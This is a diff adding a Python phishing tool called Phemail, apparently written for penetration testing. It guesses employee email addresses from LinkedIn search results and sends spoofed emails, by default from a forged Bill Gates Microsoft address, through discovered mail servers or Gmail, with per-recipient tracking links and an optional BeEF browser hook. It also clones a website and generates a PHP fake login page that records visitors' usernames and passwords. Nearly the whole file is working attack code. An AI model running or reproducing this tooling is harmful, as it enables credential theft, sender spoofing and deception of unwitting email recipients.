@@ -1,0 +1,598 @@
+#!/usr/bin/python
+
+import smtplib, base64, os, sys, getopt, urllib2, urllib, re, socket, time, itertools, urlparse
+try:
+    #from BeautifulSoup import BeautifulSoup
+    from bs4 import BeautifulSoup
+except:
+    print "No BeautifulSoup installed"
+    print "See: http://www.crummy.com/software/BeautifulSoup/#Download"
+    sys.exit()
+try:
+    import DNS
+except:
+    print "No pyDNS installed"
+    
+from optparse import OptionParser
+from email.mime.multipart import MIMEMultipart
+from email.MIMEText import MIMEText
+from email.MIMEImage import MIMEImage
+from datetime import datetime
+
+version=0.13
+
+class sendEmails:
+    
+    def __init__(self):
+        
+        self.FROM_ADDRESS = 'Bill Gates <bill.gates@microsoft.com>'
+        self.REPLY_TO_ADDRESS = 'Bill Gates <mm@ewww.co.uk>'
+        self.SUBJECT = 'Test'
+        self.filemail = 'emails.txt'
+        self.filebody = 'body.txt'
+        self.delay = 3
+        self.limit = 10
+        self.Discovered = {}
+        self.emailSent = []
+        self.emailFail = []
+        self.google = False
+        self.guser = 'test'
+        self.gpass = 'test'
+        self.MAIL_SERVER = None
+        self.Beef = False
+        self.verbose = False
+        self.socEng = ''
+        
+    def getWebServer(self):
+        webserver = self.socEng
+        return webserver
+    
+    def discoverSMTP(self, domain):
+        DNS.DiscoverNameServers()
+        mx_hosts = DNS.mxlookup(domain)
+        return mx_hosts
+            
+    def checkEmail(self, emails):
+        for email in emails:
+            if not re.match(r"([a-zA-Z\.\-\_1-9]+)\@([a-zA-Z\.\-\_1-9]+)\.([a-z]+)", email):
+                print "Error: not a valid email "+email
+                print "Check "+self.filemail
+                exit()
+                  
+    def discoveredDomain (self, emails):
+        for email in emails:
+            domain = email.split('@')[1]
+            if domain not in self.Discovered:
+                self.Discovered[domain] = self.discoverSMTP(domain)
+        return self.Discovered
+    
+    def writeLog(self):
+        emailSent = self.emailSent
+        emailFail = self.emailFail
+        now = datetime.now().strftime("%d-%m-%Y_%H-%M")
+        f = open("phemail-log-"+now+".txt","w")
+        emailSent = sorted(set(emailSent))
+        emailFail = sorted(set(emailFail))
+        command = ' '.join(sys.argv)
+        f.write(command)
+        f.write("\n\nSuccessful Emails Sent:\n")
+        f.write("-------------------------\n")
+        for email in emailSent: f.write("%s\n" % email)
+        f.write("\nFailed Emails Sent:\n")
+        f.write("-------------------------\n")
+        for email in emailFail: f.write("%s\n" % email)
+        f.close()
+        print "Phemail.py log file saved: phemail-log-"+now+".txt"
+    
+    def removePictures(self,pict):
+        for i in enumerate(pict):
+            os.remove('image'+str(i)+'.jpg')        
+
+    def createMail(self,email):
+        FROM_ADDRESS = self.FROM_ADDRESS
+        SUBJECT = self.SUBJECT
+        REPLY_TO_ADDRESS = self.REPLY_TO_ADDRESS
+        filemail = self.filemail
+        
+        webserverLog = datetime.now().strftime("%d_%m_%Y_%H:%M")
+        try:
+            fb = open(self.filebody, 'rb')
+        except IOError:
+            print "File not found: "+self.filebody
+            sys.exit()
+        body = fb.read()
+        webserver = self.getWebServer() 
+        msg = MIMEMultipart('related')
+        msg['from'] = FROM_ADDRESS
+        msg['subject'] = SUBJECT
+        msg.add_header('reply-to', REPLY_TO_ADDRESS)
+        msg['to'] = email
+        msg.preamble = 'This is a multi-part message in MIME format.'
+        msgAlt = MIMEMultipart('alternative')
+        msg.attach(msgAlt)
+        msgText = MIMEText('This is the alternative plain text message.')
+        msgAlt.attach(msgText)
+        html = BeautifulSoup(body)
+        pict=[]
+        for i,x in enumerate(html.findAll('img')):
+            picname = 'image'+str(i)+'.jpg'
+            try:
+                ft = open(picname, 'rb')
+            except IOError :
+                urllib.urlretrieve(x['src'], picname)
+                print "Downloaded "+picname
+                ft = open(picname, 'rb')
+            pict.append(MIMEImage(ft.read()))
+            ft.close()
+            body = body.replace(x['src'].encode('utf-8'),  'cid:image'+str(i))
+        # add feature
+        if self.Beef :
+            url=webserver+"/index.php?e="+base64.b64encode(email).rstrip("=")+"&b=1" 
+        else:
+            url=webserver+"/index.php?e="+base64.b64encode(email).rstrip("=")+"&b=0" 
+        url = url+"&l="+base64.b64encode(webserverLog).rstrip("=")
+        msgAlt.attach(MIMEText(body.format(url),'html'))
+        for i,pic in enumerate(pict): 
+            pic.add_header('Content-ID', '<image'+str(i)+'>')
+            msg.attach(pic)
+        fb.close()
+        return msg['from'], msg['to'], msg.as_string(), pict
+
+    def sendMail(self):
+        delay = self.delay
+        verbose = self.verbose
+        MAIL_SERVER = self.MAIL_SERVER
+        numLimit = int(self.limit)
+        limit = 0
+        
+        webserver = self.getWebServer()
+        # get emails
+        Emails = [line.strip() for line in open(self.filemail)]
+        # sort and unique Emails
+        Emails = sorted(set(Emails))
+        self.checkEmail(Emails)
+        emailSent = self.emailSent
+        emailFail = self.emailFail
+        Discovered = self.discoveredDomain(Emails)
+    
+        for domain in Discovered:
+            print "Domain: "+domain
+            # check if the SMTP Server option is provided
+            if MAIL_SERVER :
+                print "SMTP server: "+MAIL_SERVER
+                server = smtplib.SMTP(MAIL_SERVER)
+                mx = [(10, MAIL_SERVER)]
+                server.helo(webserver)
+            else:
+                if Discovered[domain]:
+                    mx = itertools.cycle(Discovered[domain])
+                    mx_current = mx.next()[1]
+                    print "SMTP server: "+mx_current
+                    server = smtplib.SMTP(mx_current)
+                    server.helo(webserver)
+                    
+            for email in Emails:
+                if domain == email.split('@')[1]:
+                    FROM, TO, MSG, pict = self.createMail(email)               
+                    try:
+                        server.sendmail(FROM, TO, MSG)
+                        print "Sent to "+email
+                        time.sleep(delay)
+                        emailSent.append(email)
+                    except Exception,e:
+                        print "Error: sending to "+email
+                        emailFail.append(email)
+                        if verbose : print e 
+                    limit = limit + 1
+                    if numLimit == limit:
+                        print "Connection closed to SMTP server: "+mx_current
+                        server.close()
+                        time.sleep(delay)
+                        mx_current = mx.next()[1]
+                        print "Domain: "+domain
+                        print "SMTP server: "+mx_current
+                        server = smtplib.SMTP(mx_current) 
+                        limit = 0  
+
+        self.removePictures(pict)
+        self.writeLog()
+        print "PHishing URLs point to "+webserver
+
+    def sendGMail(self):
+        guser = self.guser
+        gpass = self.gpass
+        delay = self.delay
+        numLimit = int(self.limit)
+        limit = 0
+        verbose = self.verbose
+        MAIL_SERVER= self.MAIL_SERVER
+        webserver = self.getWebServer()
+        # get emails
+        Emails = [line.strip() for line in open(self.filemail)]
+        # sort and unique
+        Emails = sorted(set(Emails))
+        self.checkEmail(Emails)
+        emailSent = self.emailSent
+        emailFail = self.emailFail
+        MAIL_SERVER = 'smtp.gmail.com'
+        
+        print "SMTP server: "+ MAIL_SERVER
+        server = smtplib.SMTP(MAIL_SERVER,587)
+        
+        for email in Emails:
+            FROM, TO, MSG, pict = self.createMail(email)
+            if email not in emailSent:           
+                try:
+                    server.ehlo()
+                    server.starttls()
+                    server.ehlo()
+                    server.login(guser, gpass)
+                    server.sendmail(FROM, TO, MSG)
+                    time.sleep(delay)
+                    emailSent.append(email)
+                except Exception,e:
+                    print "Error: sending to "+email
+                    emailFail.append(email)
+                    if verbose : print e 
+                limit = limit + 1
+            
+            if numLimit == limit :
+                print "Connection closed to SMTP server: "+MAIL_SERVER
+                server.close()
+                time.sleep(delay)
+                print "SMTP server: "+MAIL_SERVER
+                server = smtplib.SMTP(MAIL_SERVER,587)
+                limit = 0        
+                
+        self.removePictures(pict)
+        self.writeLog()
+    
+class harvestEmails:
+    
+    def __init__(self):
+        
+        self.agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
+        self.headers={'User-Agent':self.agent,}
+        self.format = 0
+        self.pages = 10
+        self.search = "dionach"
+        self.domain = "example.com"
+        self.verbose = False
+        
+        
+    def gatherEmails(self):
+        pages = self.pages
+        search = self.search.replace(" ","+")
+        domain = self.domain
+        format = self.format
+        verbose = self.verbose
+        emails = []
+        print "Gathering emails for domain: "+domain
+        print "Google Query: "+search
+        for page in range (0, pages):
+            url = "http://www.google.co.uk/search?hl=en&safe=off&q=site:linkedin.com/pub+"+re.sub('\..*','',search)+"&start="+str(page)+"0"
+            if verbose: print "Google Query "+url
+            request=urllib2.Request(url,None,self.headers)
+            response = urllib2.urlopen(request)
+            data = response.read()
+            html = BeautifulSoup(data)
+            regex = re.compile("linkedin\.com/pub/([a-zA-Z\'\-]+)\-([\-a-zA-Z\']+)")
+            usernames = regex.findall(str(html))
+            if verbose: print usernames
+            sys.stdout.write("\r%d%%" %((100*(page+1))/pages))
+            sys.stdout.flush()
+            for email in usernames:
+                if format == '0' : emails.append(email[0]+" "+email[1]+"@"+domain)           # 0- firstname surname
+                elif format == '1' : emails.append(email[0]+"."+email[1]+"@"+domain)         # 1- firstname.surname@example.com
+                elif format == '2' : emails.append(email[0]+email[1]+"@"+domain)             # 2- firstnamesurname@example.com     
+                elif format == '3' : emails.append(email[0][0:1]+"."+email[1]+"@"+domain)    # 3- f.surname@example.com
+                elif format == '4' : emails.append(email[0]+"."+email[1][0:1]+"@"+domain)    # 4- firstname.s@example.com
+                elif format == '5' : emails.append(email[1]+"."+email[0]+"@"+domain)         # 5- surname.firstname@example.com
+                elif format == '6' : emails.append(email[1][0:1]+"."+email[0]+"@"+domain)    # 6- s.firstname@example.com
+                elif format == '7' : emails.append(email[0][0:1]+"@"+domain)                 # 7- surname.f@example.co    
+                elif format == '8' : emails.append(email[1]+email[0]+"@"+domain)             # 8- surnamefirstname@example.com
+                elif format == '9' : emails.append(email[0]+"_"+email[1]+"@"+domain)         # 9- firstname_surname@example.com
+        # sort and unique
+        emails = sorted(set(emails))
+        # write into file
+        f = open("emails.txt","w")
+        print ""
+        for email in emails: f.write("%s\n" % email); print email
+        f.close()
+        print "\nemails.txt updated"
+        sys.exit()
+        
+class cloneWebsite:
+    
+    def __init__(self):
+        
+        self.HTML = "<html></html>"
+        self.URL = "http://www.dionach.com"
+        self.scheme = 'http'
+        self.netloc = 'www.dionach.com'
+        self.agent= 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
+        self.headers={'User-Agent':self.agent,}
+        self.FakeLogin = False
+        self.verbose = False
+        
+        
+    def downloadCode(self, url):        
+        request=urllib2.Request(url,None,self.headers)
+        response = urllib2.urlopen(request)
+        data = response.read()
+        return data
+        
+            
+    def replaceCSS(self):       
+        url = self.URL
+        scheme = self.scheme
+        netloc = self.netloc
+        html = self.HTML
+        soap = BeautifulSoup(html)
+        verbose = self.verbose
+        directory = url.path.split("/")
+        #htmlTag = {"script":"src"}  
+        htmlTag = {"link":"href","img":"src","script":"src"}  
+        
+        # replace link tag  with the correct URL in href.. same for img and src
+        # tag = link
+        # rtag = href
+        for tag,rtag in htmlTag.items():
+            for x in soap.findAll(tag):
+                try:
+                    if verbose : print "Replacing "+tag+" tag: "+x[rtag].encode('utf-8')
+                    rpath = ""
+                    tmpURL= x[rtag].encode('utf-8')
+                    # replace // with http -> see gmail.com
+                    if re.match("//", tmpURL) : tmpURL = tmpURL.replace("//","http://")
+                    request=urllib2.Request(tmpURL,None,self.headers)
+                    if verbose : print "With: "+tmpURL 
+                    try:
+                        response = urllib2.urlopen(request)
+                        if response.getcode() == 200:
+                            html = html.replace(x[rtag].encode('utf-8'),  tmpURL)
+                            #break
+                    except:
+                        for index in p(len(directory)):
+                            tmpURL = scheme+"://"+netloc+rpath+"/"+x[rtag].encode('utf-8')
+                            if verbose : print "With: "+tmpURL
+                            request=urllib2.Request(tmpURL,None,self.headers)
+                            try:
+                                response = urllib2.urlopen(request)
+                                if response.getcode() == 200:
+                                    html = html.replace(x[rtag].encode('utf-8'),  tmpURL)
+                                    break
+                            except urllib2.HTTPError:
+                                rpath = directory[index] +"/"+directory[index+1]
+                                index = index + 1
+                except KeyError:
+                    pass
+        '''               
+        htmlTag = {"a":"href"}
+        for tag,rtag in htmlTag.items():
+            for x in soap.findAll(tag):
+                try: 
+                    if rtag != 'javascript:void(0)':
+                        if verbose : print "Replacing "+tag+" tag: "+x[rtag].encode('utf-8')
+                        tmpURL= x[rtag].encode('utf-8')
+                        if re.match("//", tmpURL) :
+                            tmpURL = tmpURL.replace("//","http://")
+                            if verbose : print "With: "+tmpURL
+                        else:
+                            tmpURL = scheme+"://"+netloc+rpath+"/"+x[rtag].encode('utf-8')
+                            if verbose : print "With: "+tmpURL
+                    html = html.replace(x[rtag].encode('utf-8'),  tmpURL)
+                except KeyError:
+                    pass
+        '''              
+     
+        ''' old!
+        for x in soap.findAll('link'): 
+            html = html.replace(x['href'].encode('utf-8'),  scheme+"://"+netloc+"/"+x['href'].encode('utf-8'))
+            if verbose : print "Replacing: "+x['href'].encode('utf-8')+"\nWith: "+scheme+"://"+netloc+"/"+x['href'].encode('utf-8')       
+        '''  
+        
+        '''old!
+        for x in soap.findAll('img'): 
+            html = html.replace(x['src'].encode('utf-8'),  scheme+"://"+netloc+"/"+x['src'].encode('utf-8'))
+            if verbose : print "Replacing: "+x['src'].encode('utf-8')+"\nWith: "+scheme+"://"+netloc+"/"+x['src'].encode('utf-8')
+        '''        
+        
+        self.HTML = html
+        
+        
+    def createFakeLogin(self):
+        html = self.HTML
+        domain = self.netloc
+        soap = BeautifulSoup(html)
+        usr = ["username", "user", "usr"]
+        psw = ["password", "pass", "psw"]
+        
+
+        for i,x in enumerate(soap.findAll('form')):
+            try:
+                html = html.replace(x['action'].encode('utf-8'),  "login.php")
+            except:
+                pass
+        for val in usr:
+            for i,x in enumerate(soap.findAll('input', id=val)):
+                html = html.replace(x['name'].encode('utf-8'),  "username")
+        for val in psw:
+            for i,x in enumerate(soap.findAll('input', id=val)):
+                html = html.replace(x['name'].encode('utf-8'),  "password")
+        
+        
+        html = html.replace("'", r"\'")
+        
+        html = '<?php\n$body=\''+html+"""
+        
+$email = base64_decode($_GET["e"]);
+$log = base64_decode($_GET["l"]);
+// CHANGE HERE
+//if (preg_match("/@"""+domain+"""/i", $email)) {
+    echo $body;
+//} else {
+//   exit();
+//}
+';
+$username = $_POST['username'];
+$Password = $_POST['Password'];
+$myFile = "/tmp/phemail_log_" . preg_replace('/[^\w-]/', '', $log). ".txt";
+$fh = fopen($myFile, 'a') or die("can't open file");
+if ($email){ 
+    fwrite($fh,"Email: ".$email."\n");
+    $date = date("D d/m/Y H:i:s");
+        fwrite($fh,"Date: ".$date."\n");
+}
+
+if ($username){
+    fwrite($fh,"Username: ".$username."\\n");
+    fwrite($fh,"Password: ".$Password."\\n");
+    fwrite($fh,"\\n");
+    echo '<META HTTP-EQUIV=Refresh CONTENT="0; URL=http://www.google.co.uk">';  
+}
+?>
+"""       
+        self.HTML = html
+      
+        
+    def writeToFile(self,filename,extension,data):
+        filename = filename+"."+extension
+        f = open(filename,"w")
+        f.write(data)
+        f.close
+        print "File saved: "+filename
+        
+        
+    
+def usage(version):
+    print "PHishing EMAIL tool v"+str(version)+"\nUsage: " + os.path.basename(sys.argv[0]) + """ [-e <emails>] [-m <mail_server>] [-f <from_address>] [-r <replay_address>] [-s <subject>] [-b <body>]
+          -e    emails: File containing list of emails (Default: emails.txt)
+          -f    from_address: Source email address displayed in FROM field of the email (Default: Bill Gates <bill.gates@example.com>)
+          -r    reply_address: Actual email address used to send the emails in case that people reply to the email (Default: Bill Gates <bill.gates@example.com>)
+          -s    subject: Subject of the email (Default: Newsletter)
+          -b    body: Body of the email (Default: body.txt)
+          -p    pages: Specifies number of results pages searched (Default: 10 pages)
+          -v    verbose: Verbose Mode (Default: false)
+          -l    layout: Send email with no embedded pictures 
+          -B    BeEF: Add the hook for BeEF
+          -m    mail_server: SMTP mail server to connect to
+          -g    Google: Use a google account username:password
+          -t    Time delay: Add deleay between each email (Default: 3 sec)
+          -R    Bunch of emails per time (Default: 10 emails)
+          -L    webserverLog: Customise the name of the webserver log file (Default: Date time in format "%d_%m_%Y_%H_%M")
+          -S    Search: query on Google
+          -d    domain: of email addresses
+          -n    number: of emails per connection (Default: 10 emails)
+          -c    clone: Clone website and create a fake index.html page
+          -C    clone: Clone website and create a fake login.php page
+          -w    website: where the phishing email link points to 
+          -F    Format (Default: 0): 
+                0- firstname surname
+                1- firstname.surname@example.com
+                2- firstnamesurname@example.com
+                3- f.surname@example.com
+                4- firstname.s@example.com
+                5- surname.firstname@example.com
+                6- s.firstname@example.com
+                7- surname.f@example.com
+                8- surnamefirstname@example.com
+                9- firstname_surname@example.com 
+          """
+    print "Examples: "+ os.path.basename(sys.argv[0]) +" -e emails.txt -f \"BilL Gates <bill.gates@example.com>\" -r \"Bill Gates <bill.gates@example.com>\" -s \"Hello\" -b body.txt"
+    print "          "+ os.path.basename(sys.argv[0]) +" -S dionach -d dionach.com -F 1 -p 12"
+    print "          "+ os.path.basename(sys.argv[0]) +" -c https://gmail.com"
+
+if __name__ == "__main__":
+    # command line arguments / switches
+    
+    sender = sendEmails()
+    harvester = harvestEmails()
+    cloner = cloneWebsite()
+    
+    if sys.argv[1:]:
+        optlist, args = getopt.getopt(sys.argv[1:], 'he:f:r:s:b:p:g:w:lBm:vL:F:S:d:t:n:c:C:R:w:')
+
+        for o, a in optlist:
+            if o == "-h":
+                usage(version)
+                sys.exit()
+            elif o == "-e":
+                sender.filemail = a
+            elif o == "-f":
+                sender.FROM_ADDRESS = a
+            elif o == "-r":
+                sender.REPLY_TO_ADDRESS = a
+            elif o == "-s":
+                sender.SUBJECT =a 
+            elif o == "-b":
+                sender.filebody = a
+            elif o == "-S":
+                harvester.search = a
+            elif o == "-d":
+                harvester.domain = a
+            elif o == "-F":
+                harvester.format = a
+            elif o == "-p":
+                harvester.pages = int(a)
+            elif o == "-l":
+                NoPict = True
+            elif o == "-m":
+                sender.MAIL_SERVER = a
+            elif o == "-B":
+                sender.Beef = a
+            elif o == "-w":
+                sender.socEng = a
+            elif o == "-c" or o == "-C":
+                # check URL - default 
+                pUrl = urlparse.urlparse(a)
+                cloner.URL = pUrl            
+                #clean up supplied URLs
+                cloner.scheme = pUrl.scheme.lower()
+                cloner.netloc = pUrl.netloc.lower()
+                if not cloner.scheme:
+                    print 'ERROR: http(s):// prefix required'
+                    exit(1)
+                if o == "-C":
+                    cloner.FakeLogin = True
+            elif o == "-v":
+                harvester.verbose = True
+                sender.verbose = True
+                cloner.verbose = True
+            elif o == "-g":
+                sender.google = True
+                sender.guser,sender.gpass = a.split(":")
+            elif o == "-t":
+                sender.delay = int(a)
+            elif o == "-R":
+                sender.limit = int(a)
+            elif o == "-n":
+                limit = int(a)
+            elif o == "-L":  
+                webserverLog = "".join([c for c in a if re.match(r'\w', c)]) 
+            else:
+                usage(version)
+                sys.exit()
+                
+    else:
+        usage(version)
+        sys.exit()
+    
+    if not harvester.domain == "example.com" :
+        harvester.gatherEmails()
+    if not cloner.URL == "http://www.dionach.com" :
+        print "Cloning the website: "+cloner.URL.geturl()
+        cloner.HTML = cloner.downloadCode(cloner.URL.geturl())
+        cloner.replaceCSS()
+        cloner.writeToFile("index", "html", cloner.HTML)
+        if cloner.FakeLogin :
+            print "Creating fake login page"
+            cloner.createFakeLogin()
+            cloner.writeToFile("login", "php", cloner.HTML)
+        sys.exit()
+        #print cloner.URL+"cloned and fake login created in LOGIN.PHP"
+    if sender.google :
+        sender.sendGMail()
+    else:
+        sender.sendMail()
+    
